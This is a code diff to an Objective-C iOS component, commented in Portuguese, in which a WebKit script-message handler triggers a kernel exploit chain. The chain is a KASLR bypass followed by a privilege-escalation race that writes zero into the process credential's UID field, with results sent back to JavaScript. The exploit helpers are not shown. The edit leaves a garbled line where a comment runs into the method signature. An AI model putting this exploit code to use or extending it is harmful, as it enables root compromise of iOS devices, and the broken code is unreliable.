@@ -71,32 +71,36 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return 0;
 }
 
-// --- MÉTODO DE COMUNICAÇÃO COM O HTML ---
-- (void)userContentController:(WKUserContentController *)userContentController 
+// --- MÉTODO DE COMUNICAÇÃO COM O - (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
                  replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
-
-    // Movemos o exploit para uma thread global (Background)
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        
-        // 1. Inicia busca pelo slide (isso leva tempo e travava o app)
-        uint64_t slide = [self getKernelSlide];
-        
-        // 2. Executa a escalada de privilégio
-        uint64_t ucred = [self get_my_ucred_ptr];
-        if (ucred) {
-            [self ppl_write_race:(ucred + 0x18) value:0]; 
-        }
-
-        // 3. Responde ao JavaScript (Voltando para a Main Thread para o WebKit)
-        dispatch_async(dispatch_get_main_queue(), ^{
-            replyHandler(@{
-                @"status": @"OK",
-                @"slide": [NSString stringWithFormat:@"0x%llx", slide],
-                @"pid": @(getpid()) // Apenas para confirmar execução
-            }, nil);
+    
+    NSString *action = message.body[@"action"];
+    
+    if ([action isEqualToString:@"pte_patch"]) {
+        // [!] Movemos para background para NÃO TRAVAR a interface
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+            
+            // 1. KASLR Bypass (O loop pesado acontece aqui)
+            uint64_t slide = [self getKernelSlide];
+            
+            // 2. Privilege Escalation
+            uint64_t ucred = [self get_my_ucred_ptr];
+            if (ucred) {
+                [self ppl_write_race:(ucred + 0x18) value:0]; // UID 0
+            }
+            
+            // 3. Resposta enviada de volta para o JavaScript
+            // (O WebKit exige que o replyHandler seja chamado na Main Thread)
+            dispatch_async(dispatch_get_main_queue(), ^{
+                replyHandler(@{
+                    @"status": @"SUCCESS",
+                    @"slide": [NSString stringWithFormat:@"0x%llx", slide],
+                    @"uid": @(0)
+                }, nil);
+            });
         });
-    });
+    }
 }
 
 @end
